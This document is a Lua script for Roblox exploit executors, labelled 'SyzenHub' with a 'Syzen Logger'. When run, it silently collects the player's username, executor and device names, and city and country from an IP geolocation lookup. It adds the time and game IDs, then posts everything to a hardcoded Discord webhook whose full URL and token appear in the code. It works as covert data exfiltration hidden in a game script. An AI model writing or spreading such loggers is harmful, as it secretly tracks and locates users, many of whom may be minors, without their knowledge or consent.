local HttpService = game:GetService("HttpService")
local url = "https://discord.com/api/webhooks/1386352896899284992/wIeRGYiwZmYRK7g5z1W-wsFdSMjtM02lm8qKifvWmMQeUA2V44z8NjSURPN4UInDXzlS"

pcall(function()
    local user = game:GetService("Players").LocalPlayer
    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    local deviceName = (getidentity and getidentity().device or getexecutorname and getexecutorname()) or "Unknown Device"

    local city, country = "Unknown", "Unknown"
    local success, response = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)
    if success then
        local data = HttpService:JSONDecode(response)
        city = data.city or "Unknown"
        country = data.country or "Unknown"
    end

    local function get12HourTime()
        return os.date("%I:%M %p")
    end

    local gameId = tostring(game.GameId)
    local placeId = tostring(game.PlaceId)
    local joinLink = "roblox://placeId=" .. placeId

    local embed = {
        title = "🟢 SyzenHub Script Executed",
        fields = {
            { name = "👤 Username", value = user.Name, inline = true },
            { name = "🧠 Executor", value = executor, inline = true },
            { name = "📱 Device", value = deviceName, inline = true },
            { name = "🌍 Location", value = city .. ", " .. country, inline = true },
            { name = "🕒 Time", value = get12HourTime(), inline = true },
            { name = "🆔 Game ID", value = gameId, inline = true },
            { name = "🎮 Join Game", value = "["..placeId.."]("..joinLink..")", inline = false }
        },
        color = 65280
    }

    local payload = HttpService:JSONEncode({
        embeds = {embed},
        username = "Syzen Logger"
    })

    local send = (syn and syn.request) or (http and http.request) or (http_request)
    if send then
        send({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end
end)
